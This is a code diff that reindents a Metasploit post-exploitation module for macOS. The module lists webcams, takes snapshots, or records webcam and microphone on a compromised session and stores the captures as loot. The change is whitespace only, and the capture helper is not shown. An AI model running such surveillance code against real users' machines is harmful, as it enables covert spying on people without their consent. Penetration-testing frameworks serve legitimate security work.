@@ -13,27 +13,27 @@ class Metasploit3 < Msf::Post
 	include Msf::Auxiliary::Report
 	include Msf::Post::OSX::RubyDL
 
-	POLL_TIMEOUT = 120
+  POLL_TIMEOUT = 120
 
-	def initialize(info={})
-		super(update_info(info,
-			'Name'          => 'OSX Manage Webcam',
-			'Description'   => %q{
-					This module will allow the user to detect installed webcams (with
-					the LIST action), take a snapshot (with the SNAPSHOT action), or
-					record a webcam and mic (with the RECORD action)
-			},
-			'License'       => MSF_LICENSE,
-			'Author'        => [ 'joev <jvennix[at]rapid7.com>'],
-			'Platform'      => [ 'osx'],
-			'SessionTypes'  => [ 'shell', 'meterpreter' ],
-			'Actions'       => [
-				[ 'LIST',     { 'Description' => 'Show a list of webcams' } ],
-				[ 'SNAPSHOT', { 'Description' => 'Take a snapshot with the webcam' } ],
-				[ 'RECORD', { 'Description' => 'Record with the webcam' } ]
-			],
-			'DefaultAction' => 'LIST'
-		))
+  def initialize(info={})
+    super(update_info(info,
+      'Name'          => 'OSX Manage Webcam',
+      'Description'   => %q{
+          This module will allow the user to detect installed webcams (with
+          the LIST action), take a snapshot (with the SNAPSHOT action), or
+          record a webcam and mic (with the RECORD action)
+      },
+      'License'       => MSF_LICENSE,
+      'Author'        => [ 'joev <jvennix[at]rapid7.com>'],
+      'Platform'      => [ 'osx'],
+      'SessionTypes'  => [ 'shell', 'meterpreter' ],
+      'Actions'       => [
+        [ 'LIST',     { 'Description' => 'Show a list of webcams' } ],
+        [ 'SNAPSHOT', { 'Description' => 'Take a snapshot with the webcam' } ],
+        [ 'RECORD', { 'Description' => 'Record with the webcam' } ]
+      ],
+      'DefaultAction' => 'LIST'
+    ))
 
 		register_options(
 			[
@@ -58,27 +58,27 @@ class Metasploit3 < Msf::Post
 			], self.class)
 	end
 
-	def run
-		fail_with("Invalid session ID selected.") if client.nil?
-		fail_with("Invalid action") if action.nil?
+  def run
+    fail_with("Invalid session ID selected.") if client.nil?
+    fail_with("Invalid action") if action.nil?
 
-		num_chunks = (datastore['RECORD_LEN'].to_f/datastore['SYNC_WAIT'].to_f).ceil
-		tmp_file = datastore['TMP_FILE'].gsub('<random>') { Rex::Text.rand_text_alpha(10)+'1' }
-		ruby_cmd = osx_capture_media(
-			:action => action.name.downcase,
-			:snap_filetype => datastore['SNAP_FILETYPE'],
-			:audio_enabled => datastore['AUDIO_ENABLED'],
-			:video_enabled => true,
-			:num_chunks => num_chunks,
-			:chunk_len => datastore['SYNC_WAIT'],
-			:video_device => datastore['CAMERA_INDEX'],
-			:audio_device => datastore['MIC_INDEX'],
-			:snap_jpg_compression => datastore['JPG_QUALITY'].to_f,
-			:video_compression => datastore['VIDEO_COMPRESSION'],
-			:audio_compression => datastore['AUDIO_COMPRESSION'],
-			:record_file => tmp_file,
-			:snap_file => tmp_file+datastore['SNAP_FILETYPE']
-		)
+    num_chunks = (datastore['RECORD_LEN'].to_f/datastore['SYNC_WAIT'].to_f).ceil
+    tmp_file = datastore['TMP_FILE'].gsub('<random>') { Rex::Text.rand_text_alpha(10)+'1' }
+    ruby_cmd = osx_capture_media(
+      :action => action.name.downcase,
+      :snap_filetype => datastore['SNAP_FILETYPE'],
+      :audio_enabled => datastore['AUDIO_ENABLED'],
+      :video_enabled => true,
+      :num_chunks => num_chunks,
+      :chunk_len => datastore['SYNC_WAIT'],
+      :video_device => datastore['CAMERA_INDEX'],
+      :audio_device => datastore['MIC_INDEX'],
+      :snap_jpg_compression => datastore['JPG_QUALITY'].to_f,
+      :video_compression => datastore['VIDEO_COMPRESSION'],
+      :audio_compression => datastore['AUDIO_COMPRESSION'],
+      :record_file => tmp_file,
+      :snap_file => tmp_file+datastore['SNAP_FILETYPE']
+    )
 
 		output = cmd_exec(['ruby', '-e', ruby_cmd].shelljoin)
 		if action.name =~ /list/i
@@ -126,26 +126,26 @@ class Metasploit3 < Msf::Post
 				return
 			end
 
-			snap_type = datastore['SNAP_FILETYPE']
-			img = read_file(tmp_file+snap_type)
-			f = store_loot("OSX Webcam Snapshot", "image/#{snap_type}",
-				session, img, "osx_webcam_snapshot.#{snap_type}", 'OSX Webcam Snapshot')
-			print_good "Snapshot successfully taken and saved to #{f}"
-		end
-	end
+      snap_type = datastore['SNAP_FILETYPE']
+      img = read_file(tmp_file+snap_type)
+      f = store_loot("OSX Webcam Snapshot", "image/#{snap_type}",
+        session, img, "osx_webcam_snapshot.#{snap_type}", 'OSX Webcam Snapshot')
+      print_good "Snapshot successfully taken and saved to #{f}"
+    end
+  end
 
-	def cleanup
-		return unless @cleaning_up.nil?
-		@cleaning_up = true
+  def cleanup
+    return unless @cleaning_up.nil?
+    @cleaning_up = true
 
-		if action.name =~ /record/i and not @pid.nil?
-			print_status("Killing record service...")
-			cmd_exec("/bin/kill -9 #{@pid}")
-		end
-	end
+    if action.name =~ /record/i and not @pid.nil?
+      print_status("Killing record service...")
+      cmd_exec("/bin/kill -9 #{@pid}")
+    end
+  end
 
-	private
+  private
 
-	def poll_timeout; POLL_TIMEOUT; end
-	def fail_with(msg); raise msg; end
+  def poll_timeout; POLL_TIMEOUT; end
+  def fail_with(msg); raise msg; end
 end
